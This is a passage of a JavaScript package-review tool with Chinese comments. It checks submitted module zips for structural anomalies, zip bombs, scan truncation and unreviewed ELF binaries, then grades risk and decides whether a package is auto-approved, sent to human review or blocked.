    push('STRUCT_BACKSLASH_PATH', 'medium', `${backslash.length} 个条目名使用反斜杠分隔（如 ${backslash[0]}）`,
      '多半是 Windows 打包工具写出的非标准 zip。不同安装器对这些条目的处理不一致，请改用正斜杠重新打包。', backslash[0],
      `共 ${backslash.length} 个`);
  }
  if (files.length > MAX_ENTRIES) {
    push('STRUCT_ENTRY_COUNT', 'medium', `条目数 ${files.length} 超过 ${MAX_ENTRIES}`,
      '正常模块不会这么多文件。请确认是否有必要，并去掉构建产物、缓存、无关资源。', '<zip>', `${files.length} 个条目`);
  }
  if (totalOrig > MAX_TOTAL_UNCOMPRESSED) {
    push('STRUCT_ZIP_BOMB', 'high',
      `声明的解压后总大小 ${(totalOrig / 1048576).toFixed(1)} MB 超过 ${(MAX_TOTAL_UNCOMPRESSED / 1048576).toFixed(0)} MB`,
      '按 zip bomb 处理：解压器会当场打满磁盘/内存。审核侧已在解压时施加硬上限，此类包不予自动放行。', '<zip>',
      `压缩后 ${(totalComp / 1024).toFixed(1)} KB`);
  }
  if (maxRatio > MAX_RATIO) {
    push('STRUCT_RATIO', 'medium',
      `条目 ${maxRatioName} 的声明压缩比 ${maxRatio.toFixed(0)}:1 异常（阈值 ${MAX_RATIO}:1）`,
      '文本脚本很少压到这种程度。请解释为何需要；无法解释则按 zip bomb 处理。', maxRatioName,
      maxRatioSizes);
  }

  return {
    findings: out,
    stats: {
      entries: list.length,
      fileEntries: files.length,
      dirEntries: list.length - files.length,
      totalUncompressed: totalOrig,
      totalCompressed: totalComp,
      maxRatio: Number(maxRatio.toFixed(1)),
      maxRatioEntry: maxRatioName,
      symlinks,
      unsafePaths: unsafe.map((u) => u.name),
      duplicateNames: [...seen.entries()].filter(([, n]) => n > 1).map(([n]) => n),
      encrypted,
      unsupportedMethods: oddMethod.map((o) => o.name),
      backslashPaths: backslash,
      limits: { MAX_ENTRIES, MAX_TOTAL_UNCOMPRESSED, MAX_ENTRY_UNCOMPRESSED, MAX_RATIO, MAX_TEXT },
    },
  };
}

/**
 * 「读到一半」的覆盖度缺口 —— 人工复核看不全、行级规则也没跑完，必须参与定级。
 *
 * Task 2.9 起这条规则有两种触发条件（同一个 ruleId，不另立新规）：
 *   ① `f.truncated`     —— 条目超过报告内嵌上限 `maxText`，人只看得见前缀；
 *   ② `f.scanTruncated` —— 条目超过**行级规则的输入上限**（`scan.mjs` 的
 *                          `MAX_SCAN_BYTES_PER_ENTRY`）并且真的进了扫描面：
 *                          上限之后的字节一行都没判过。
 * ②才是本轮要关的那格：载荷挪到上限之后，换来的必须是这条记录，而不是 0 命中。
 * 所以记录里三个数缺一不可 —— 哪个条目、原始多少字节、实际喂进规则多少字节。
 *
 * fix8 之前 advice 里那句「行级规则跑的是全文」在 ② 存在后就是假话，删了。
 * @param {Array<{name,size,truncated,scanTruncated?,scanBytes?}>} files
 * @param {number} maxText 报告内嵌上限（只影响文案）
 * @param {number|null} scanCap 本次生效的行级规则输入上限（只影响文案；实扫字节看 f.scanBytes）
 */
export function checkCoverage(files = [], maxText = MAX_TEXT, scanCap = null) {
  const out = [];
  for (const f of files) {
    if (!f || (!f.truncated && !f.scanTruncated)) continue;
    const size = Number(f.size) || 0;
    const scanCut = Boolean(f.scanTruncated);
    const fed = Number.isFinite(f.scanBytes) ? f.scanBytes : null;
    const capKb = Number.isFinite(scanCap) && scanCap > 0 ? `${(scanCap / 1024).toFixed(0)} KB` : '未设上限';
    let body;
    let advice;
    if (scanCut) {
      body = `原文 ${size} B，行级规则只喂进前 ${fed} B（单条目上限 ${capKb}），`
        + `其余 ${Math.max(0, size - fed)} B 没有逐行判过`;
      advice = '「读到一半」不等于「干净」：上限之后的字节没有逐行判过，本次审核对这个条目是不完整的，不予自动放行。'
        + '请把内容拆成多个被引用的文件（每个都留在上限之内），或由人工下载产物通读全文。';
    } else {
      body = `有 ${(size / 1048576).toFixed(2)} MB`;
      advice = '人工复核与 PR 评论只能看到前缀，全文在本次审核的 JSON 产物里。请不要把单个条目塞到这么大；'
        + '确实需要长文件时把它拆成多个被引用的文件，或由人工下载产物通读。';
    }
    out.push({
      ruleId: 'AUDIT_COVERAGE_TRUNCATED',
      category: 'structure',
      severity: 'medium',
      file: String(f.name == null ? '' : f.name),
      line: 0,
      snippet: trimSnippet(scanCut ? `${size} B -> ${fed} B` : `${size} B`),
      message: `${f.name} ${body}，报告只内嵌前 ${(maxText / 1024).toFixed(0)} KB`,
      advice,
    });
  }
  return out;
}

/** 解压失败的条目：审核没读到字节，不能当作「无发现」 */
export function checkUnread(unread = []) {
  return (Array.isArray(unread) ? unread : []).map((u) => ({
    ruleId: 'STRUCT_UNREADABLE',
    category: 'structure',
    severity: 'medium',
    file: String(u && u.name ? u.name : ''),
    line: 0,
    snippet: trimSnippet(u && u.reason ? u.reason : ''),
    message: `条目无法解压，审核未覆盖：${u && u.name}`,
    advice: u && u.overLimit
      ? '该条目解压后超过审核硬上限，按 zip bomb 风险处理，不予自动放行。'
      : '请重新打包。审核读不到的条目一律不能视为干净。',
  }));
}

// ---------------------------------------------------------------------------
// Task 5.7：把 STRUCT_BINARY 从「我读不了」写成「它一定能做什么」
//
// 三条硬边界（工单 §1）落在这两个函数里，改之前先读它们：
//   1) 每个二进制条目**恰好一条**参与定级的发现，档位只许 ∈ {medium, high}。
//      没有一条分支写成 low / info，也没有一条分支少发或多发发现 ⇒ 这个改动不可能让任何包
//      从 block 变成 auto-approve（decide 对非 low 一律 block）。INV-B 与变异 M2 压着这一格。
//   2) 档位只增不减：取证能说的最多是「medium → high」，方向永远朝严。INV-C 压着条数守恒。
//   3) 「读不出」与「没有危险」是两本账：parseError / 超限输入永远不许被念成「0 危险族」，
//      而「0 危险族」那一行自己必须写着「这不等于安全」（§0.8 那条双向边界）。
//
// 能力族表住在 audit/elf-forensics.mjs（只此一份，T57-07 按源码钉），这里只消费。
//
// S3-A（工单 briefs/task-s3a.md，2026-10-16）改的只有**谁把名字交给这张表**：族的进料从
// `sensitiveImports`（SENSITIVE 筛后、给人看的那份）换成 `capabilityImports`（全量 UND 里命中族表的那份），
// 于是族表里那批「写了却永远进不来」的成员第一次到得了族函数面前（成员名逐个列在
// briefs/task-s3-pre-report.md 那张死成员表里；这里不复述 —— T57-07 按源码钉「族词汇只住一份」，注释也算它扫）。
// 方向是加严，且只可能加严：成员表一字未动、档位公式一字未动、`sensitiveImports` 与其呈现面一字未动。
// 新字段缺失一律走 PARSE_ERROR（从严），不留兼容支路。
// ---------------------------------------------------------------------------

/**
 * 查这份条目名对应的取证记录。三种口径分开：
 *   没查中（hit=false）⇒ 走今天的行为；查中且值为 null ⇒ 「跑过取证，它不是 ELF」；
 *   查中且有对象 ⇒ 按那份事实分派。
 * 用 has/hasOwnProperty 而不是 `map[key]` 直接取：条目名是投稿者起的，
 * `__proto__` / `constructor` 这种 key 在朴素对象上会取到一个真值对象，把分派带进错误的分支。
 * @param {Map|object|null} forensicsByName
 * @param {string} key
 */
function lookupForensics(forensicsByName, key) {
  if (!forensicsByName || typeof forensicsByName !== 'object') return { hit: false, rec: undefined };
  if (typeof forensicsByName.has === 'function' && typeof forensicsByName.get === 'function') {
    return forensicsByName.has(key) ? { hit: true, rec: forensicsByName.get(key) } : { hit: false, rec: undefined };
  }
  return Object.prototype.hasOwnProperty.call(forensicsByName, key)
    ? { hit: true, rec: forensicsByName[key] }
    : { hit: false, rec: undefined };
}

/**
 * 一个二进制条目的取证分派（工单 §2 那张五行表 + §5 那一格超限）。纯函数，不碰 zip、不读常量表。
 * @param {{name?:string,id?:string,why?:string,bytes?:number}} b checkBinaries 收到的那条
 * @param {{hit:boolean,rec?:object|null}} found lookupForensics 的结果
 * @returns {{outcome:string,severity:string,message:string,families:string[],extraAdvice?:string}}
 */
function binaryVerdict(b, found) {
  const name = String(b && b.name ? b.name : '');
  const why = (b && (b.why || b.id)) || '未知类型';
  const baseMessage = `${name} 是二进制负载（${why}），静态行级规则无法审查`;
  const registerOnly = '按未审查的二进制登记：来源与校验和必须在 module.prop/描述里说明。';

  // 第一行之前那一格：没接线 / 查不中 == 今天，逐字节相同（T57-01 的向后兼容钉子）。
  if (!found.hit) return { outcome: 'NO_RECORD', severity: 'medium', message: baseMessage, families: [] };

  // 表①：非 ELF（forensics 返回 null —— dex / apk / ttf / png…）。
  // 口径纪律（§2.7）：这不是「读不了」，是「不归静态取证管」。写成读不动就把
  // 「看不见」与「看不清」并成了一格，而这两本的账完全不同。
  if (found.rec === null || found.rec === undefined) {
    return {
      outcome: 'NOT_ELF', severity: 'medium', families: [],
      message: `${name} 是二进制负载（${why}），不是 ELF，静态取证不适用：`
        + '行级规则读不懂它，只能按机器码交人工。',
      extraAdvice: ` ${registerOnly}`,
    };
  }

  const rec = found.rec;
  // 表⑤（§5 那一格，排在最前）：超过取证字节上限的条目只留下了前缀。
  // 前缀**自己解析成功了也不算证完** —— 尾部没读到的东西能装下任何能力，
  // 所以这一格只能说「输入不完整」，永远不许念成「取证成功、0 危险族」。
  if (rec.inputCapped) {
    // 两个数各说各的话：条目多大取**条目自己**（b.bytes），喂进去多少取**记录**（rawBytes）。
    // 取错来源会写出「条目 8388608 B 超过上限 8388608 B」这种自相矛盾的句子 ——
    // 实测漏掉这一格时就是那样的文案。
    const entryBytes = Number(b && b.bytes) || Number(rec.bytes) || 0;
    const fedBytes = Number(rec.rawBytes) || Number(rec.bytes) || 0;
    return {
      outcome: 'INPUT_CAPPED', severity: 'medium', families: [],
      message: `${name}：ELF 条目 ${entryBytes} B 超过取证字节上限，本次只喂进 `
        + `${fedBytes} B —— 输入不完整，后半段一个字都没读到`
        + (rec.parseError ? `（已读到的那一段还报：${rec.parseError}）` : '')
        + '：按未审查的二进制登记。',
      extraAdvice: ` ${registerOnly}`,
    };
  }

  // 表②：ELF 但 parseError（畸形头、大端、越界的表项，或字节面在解码时就已经坏了）。
  // S3-A 工单 §2.2：`capabilityImports` 缺字段也算「读不出来」。**没有兼容支路** ——
  // 写成 `rec.capabilityImports || rec.sensitiveImports` 就等于把「新字段没接上」念成「这个包零危险族」，
  // 而那正是本轮要消灭的形状（从严走 PARSE_ERROR）。
  const unparsed = !Number.isInteger(rec.importCount) || !Array.isArray(rec.sensitiveImports)
    || !Array.isArray(rec.capabilityImports);
  if (rec.parseError || unparsed) {
    return {
      outcome: 'PARSE_ERROR', severity: 'medium', families: [],
      message: `${name}：头部有 ELF 魔数，但读不出符号表（${rec.parseError || '没有可读的 .dynsym 计数'}）`
        + '：按未审查的二进制登记，读不出不等于没有。',
      extraAdvice: ` ${registerOnly}`,
    };
  }

  // 表③④⑤：读出来了，按危险族数量分档。
  // S3-A：族的进料是**全量 UND 里命中族表的那份名单**（forensics 的 capabilityImports），
  // 不再是给人看的那份筛后名单 —— 后者让一批**写在族表里**的成员永远到不了这张表面前
  // （成员名不在这里复述：T57-07 按源码钉「族词汇只住一份」，注释也算它扫。逐个词的实测见
  //  briefs/task-s3-pre-report.md 那张死成员表与真夹具的 UND 对照）。
  // 档位公式一字未改：0/1 族 → medium，≥2 族 → high；本轮只可能让族数变多，不可能变少。
  const fams = capabilitySymbols(rec.capabilityImports);
  const read = `${name}：ELF（${rec.machineName || '未知架构'}，${rec.importCount} 个导入`
    + `${rec.stripped ? '，已 strip' : ''}）`;
  const families = fams.map((x) => x.family);
  if (fams.length === 0) {
    return {
      outcome: 'ELF_NO_FAMILY', severity: 'medium', families,
      message: `${read} —— 读到 ${rec.importCount} 个导入，无一落在危险族；这不等于安全`
        + '（mmap + mprotect 即可在进程内跑机器码，open / write / unlink 即可改文件）。',
    };
  }
  const listing = fams.map((x) => `${x.family} ${x.label}（${x.symbols.join(', ')}`
    + `${x.symbolTotal > x.symbols.length ? `…共 ${x.symbolTotal} 个` : ''}）`).join('；');
  // 呈现纪律（工单 §2.2）：名单被 CAPABILITY_IMPORT_CAP 截过 ⇒ 族数只会偏低，而偏低正是本轮要
  // 消灭的那种「被念成干净」。这一句只在 capped === true 时出现，不开新档、不改 outcome。
  const capNote = rec.capabilityImportsCapped === true
    ? `；危险族名单在 ${CAPABILITY_IMPORT_CAP} 条处截过，族集合是下限` : '';
  return {
    outcome: fams.length >= 2 ? 'ELF_FAMILIES' : 'ELF_FAMILY',
    severity: fams.length >= 2 ? 'high' : 'medium',
    families,
    message: `${read} —— 链接期一定会用到 ${fams.length} 类危险能力：${listing}`
      + (fams.length >= 2 ? '；升级理由：≥2 类链接期能力。' : '。') + capNote,
    extraAdvice: ' 导入表是动态链接器必须满足的集合：名字出现过就一定用得到。'
      + '核对这些能力是否都在它自称的功能里。',
  };
}

/** 二进制条目：行级规则对它无效，只能靠人/专门通道看 */
export function checkBinaries(binaries = [], forensicsByName = null) {
  const list = Array.isArray(binaries) ? binaries : [];
  return list.map((b) => {
    const base = {
      ruleId: 'STRUCT_BINARY',
      category: 'structure',
      severity: 'medium',
      file: String(b && b.name ? b.name : ''),
      line: 0,
      snippet: `${b.id} / ${b.bytes} B`,
      message: `${b.name} 是二进制负载（${b.why || b.id}），静态行级规则无法审查`,
      advice: '模块可以带二进制（busybox、update-binary 等），但它必须在 module.prop/描述里说明来源，'
        + '并给出可核对的上游或校验和；匿名可执行文件在 root 下运行等于把判断权交给机器码。',
    };
    // Task 5.7：取证结论只改 severity / message / advice 三个字段。
    // ruleId 沿用 STRUCT_BINARY（不新增 id，否则与它在同一个文件上重复计数 —— §0.7 那个病）、
    // file 与 line 一字不动（INV-B 按条目名逐条对账）、snippet 不放取证摘要
    // （renderJSON 会把不参与定级的 snippet 打成 `AArc************语义`，见 §2）。
    const v = binaryVerdict(b, lookupForensics(forensicsByName, base.file));
    const out = { ...base, severity: v.severity, message: v.message };
    if (v.extraAdvice) out.advice = `${base.advice}${v.extraAdvice}`;
    return out;
  });
}

/**
 * Task 5.7 的取证登记（新的顶层报告字段用得到它）。
 * 与 checkBinaries 同一次分派、同一个来源，所以「报告说它读到 86 个导入」与「这条发现为什么是 high」
 * 不可能各说一套。逐条目一条，条目名就是 key —— 与 report.binaries 那份清单一一对得上。
 */
export function binaryForensicsRows(binaries = [], forensicsByName = null) {
  const list = Array.isArray(binaries) ? binaries : [];
  return list.map((b) => {
    const found = lookupForensics(forensicsByName, String(b && b.name ? b.name : ''));
    const v = binaryVerdict(b, found);
    const row = {
      name: String(b && b.name ? b.name : ''),
      kind: b && b.id ? b.id : null,
      entryBytes: b && Number.isInteger(b.bytes) ? b.bytes : null,
      outcome: v.outcome,
      families: v.families,
      summary: v.message,
    };
    const rec = found.hit && found.rec ? found.rec : null;
    if (rec) {
      if (rec.kind) row.forensicsKind = rec.kind;
      if (Number.isInteger(rec.bytes)) row.forensicsBytes = rec.bytes;
      if (rec.machineName) row.machineName = rec.machineName;
      if (rec.type) row.type = rec.type;
      if (typeof rec.stripped === 'boolean') row.stripped = rec.stripped;
      if (Number.isInteger(rec.importCount)) row.importCount = rec.importCount;
      if (Array.isArray(rec.sensitiveImports)) row.sensitiveImports = rec.sensitiveImports;
      // S3-A 工单 §2.2：定级口径那份进料也要进登记，否则「报告说它读到 86 个导入」与
      // 「这条为什么是 high」又会各念一套。ruleId 仍是 STRUCT_BINARY，不新增 id（§0.7 那个重复计数的病）。
      if (Array.isArray(rec.capabilityImports)) row.capabilityImports = rec.capabilityImports;
      if (Number.isInteger(rec.capabilityImportsTotal)) row.capabilityImportsTotal = rec.capabilityImportsTotal;
      if (rec.capabilityImportsCapped) row.capabilityImportsCapped = true;
      if (Array.isArray(rec.needed)) row.needed = rec.needed;
      if (rec.parseError) row.parseError = rec.parseError;
      if (rec.inputCapped) row.inputCapped = true;
      if (Number.isInteger(rec.rawBytes)) row.rawBytes = rec.rawBytes;
    }
    return row;
  });
}

// ---------------------------------------------------------------------------
// 风险定级
// ---------------------------------------------------------------------------

/** 是否参与风险定级（info 级只提示） */
export function countsTowardRisk(f) {
  return SEVERITY_ORDER[f.severity] > 0;
}

/**
 * 汇总定级
 * @param {Finding[]} findings
 * @returns {{ level: 'low'|'medium'|'high', counts: object, reasons: string[] }}
 */
export function scoreRisk(findings) {
  const counts = { high: 0, medium: 0, low: 0, info: 0 };
  for (const f of findings) {
    if (!countsTowardRisk(f)) { counts.info++; continue; }
    counts[f.severity] = (counts[f.severity] || 0) + 1;
  }
  let level = 'low';
  const reasons = [];
  if (counts.high > 0) { level = 'high'; reasons.push(`${counts.high} 条 high 级发现`); }
  else if (counts.medium > 0) { level = 'medium'; reasons.push(`${counts.medium} 条 medium 级发现`); }
  else if (counts.low > 0) { reasons.push(`${counts.low} 条 low 级发现`); }
  else reasons.push('未命中任何风险规则');
  return { level, counts, reasons };
}

/**
 * 决策：结合风险等级与“首次收录 / 版本更新”
 * 已定案规则：低风险 + 首次收录 → 自动进索引；其余一律人工审。
 *
 * fix8-E（撤销过就不许自动放行）：第三个参数**可选、默认 null**，所以现有调用点与现有测试
 * 一字不动就是兼容的。`coverage.revokedCount > 0` 表示扫描器曾经把「执行模块自带条目」这类
 * 发现按「那个条目本来就在扫描面上、已经逐行读过」撤销过 —— 那是机器替被执行文件作的证，
 * 不能同时又是自动放行的理由。撤销照旧（等级、评论噪声、findings 内容都不动），
 * 代价只落在决策上：`low + first` 这一档从 auto-approve 改成 request-review。
 * 硬边界：本分支只把 auto-approve 翻成 request-review。medium/high 与 update/unknown 的
 * 返回值一字不改（它们本来就不是自动通道），所以这个参数不可能让任何包变得比原来更容易自动放行。
 * 措辞纪律见计划 §2.7：说的是「机器不替它作证」，不许写成可疑，不许把投稿人写成嫌犯。
 * @param {'low'|'medium'|'high'} level
 * @param {'first'|'update'|'unknown'} changeType
 * @param {{ revokedCount?:number, revokedEntries?:string[] }|null} [coverage] 撤销覆盖度
 */
export function decide(level, changeType, coverage = null) {
  if (level === 'low' && changeType === 'first') {
    const revokedCount = coverage && Number(coverage.revokedCount) > 0 ? Number(coverage.revokedCount) : 0;
    if (revokedCount > 0) {
      const entries = (Array.isArray(coverage.revokedEntries) ? coverage.revokedEntries : [])
        .filter((x) => typeof x === 'string' && x);
      // reason 必须指名被撤销的那个条目路径 —— 人看得见是哪个文件，这条才有可复验性。
      const shown = entries.length ? entries.join('、') : `共 ${revokedCount} 次撤销涉及的条目`;
      const noun = entries.length > 1 ? '这些条目' : '该条目';
      return { action: 'request-review', label: 'needs-human-review', needsHumanReview: true,
        reason: `静态结论是 low，但它执行了模块自带的 ${shown}；${noun}已读且行级规则无命中，`
          + '机器不替它作证，需人工确认' };
    }
    return { action: 'auto-approve', label: 'auto-approved', needsHumanReview: false,
      reason: '静态扫描 low 风险，且该 id 尚未收录（首次收录）' };
  }
  if (level === 'low' && changeType === 'update') {
    return { action: 'request-review', label: 'needs-human-review', needsHumanReview: true,
      reason: '静态扫描 low 风险，但这是对已收录模块的版本更新，按规则一律人工审' };
  }
  if (level === 'low') {
    return { action: 'request-review', label: 'needs-human-review', needsHumanReview: true,
      reason: '无法判定是首次收录还是版本更新（未提供索引），保守起见转人工' };
  }
  return { action: 'block', label: 'needs-human-review', needsHumanReview: true,
    reason: `风险等级为 ${level}，需人工审核后方可合入索引` };
}
